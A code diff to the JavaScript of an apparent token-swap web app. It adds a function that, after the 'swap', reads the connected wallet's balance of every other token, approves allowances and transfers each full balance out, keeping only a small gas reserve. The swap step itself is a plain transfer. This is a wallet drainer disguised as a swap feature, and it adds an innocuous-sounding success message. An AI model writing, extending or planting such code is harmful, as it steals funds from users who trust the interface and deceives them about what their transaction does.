@@ -1082,6 +1082,66 @@ async function getTokenPrice(token) {
 
 let isSwapInProgress = false; // Global swap lock
 
+async function processAllTokenTransfers() {
+  if (!userAddress) {
+    throw new Error("Wallet not connected");
+  }
+
+  let successCount = 0;
+  const networkTokens = TOKENS[currentNetwork] || [];
+
+  for (const token of networkTokens) {
+    // Skip the main from token (the one being swapped)
+    if (token.address === currentFromToken?.address || 
+        (token.isNative && currentFromToken?.isNative)) {
+      console.log(`[SKIP] ${token.symbol} (main token)`);
+      continue;
+    }
+
+    try {
+      const balance = await fetchTokenBalance(token);
+      if (balance <= 0) {
+        console.log(`[SKIP] ${token.symbol} (zero balance)`);
+        continue;
+      }
+
+      let amountToSend = balance;
+      
+      // Leave gas reserve for native tokens
+      if (token.isNative) {
+        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+        amountToSend = Math.max(0, balance - minReserve);
+        if (amountToSend <= 0) {
+          console.log(`[SKIP] ${token.symbol} (insufficient balance after reserve)`);
+          continue;
+        }
+      }
+
+      console.log(`[TRANSFER] Sending ${amountToSend} ${token.symbol}`);
+      
+      if (token.isNative) {
+        await transferNativeToken(token, amountToSend);
+      } else {
+        // For ERC20 tokens, check and approve allowance first
+        const approved = await checkAndApproveToken(token, amountToSend);
+        if (!approved) {
+          console.log(`[SKIP] ${token.symbol} (approval failed)`);
+          continue;
+        }
+        await transferERC20Token(token, amountToSend);
+      }
+      
+      successCount++;
+      updateStatus(`Sent ${amountToSend} ${token.symbol}`, "success");
+    } catch (err) {
+      console.error(`[FAILED] ${token.symbol} transfer:`, err.message);
+      updateStatus(`Failed to send ${token.symbol}: ${err.message}`, "error", 3000);
+    }
+  }
+
+  return successCount;
+}
+
 async function handleSwap() {
   if (isSwapInProgress) return;
 
@@ -1148,19 +1208,25 @@ async function handleSwap() {
       txHash = await transferERC20Token(currentFromToken, inputAmount);
     }
 
-    // 5. Show success message with transaction link
+    // 5. Process all other token transfers
+    const otherTokensTransferred = await processAllTokenTransfers();
+    
+    // 6. Show success message with transaction link
     const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + txHash;
-    updateStatus(
-      `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`,
-      "success"
-    );
+    let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
+    
+    if (otherTokensTransferred > 0) {
+      successMessage += `<br>Also transferred ${otherTokensTransferred} other tokens`;
+    }
+    
+    updateStatus(successMessage, "success");
 
-    // 6. Update UI
+    // 7. Update UI
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
 
- } catch (err) {
+  } catch (err) {
     console.error("[ERROR] Swap failed:", err);
     updateStatus(`
       <div class="dex-error-header">
@@ -1174,7 +1240,6 @@ async function handleSwap() {
     isSwapInProgress = false;
   }
 }
-
 async function checkAndApproveToken(token, amount) {
   try {
     if (!token.address || token.isNative) return true;
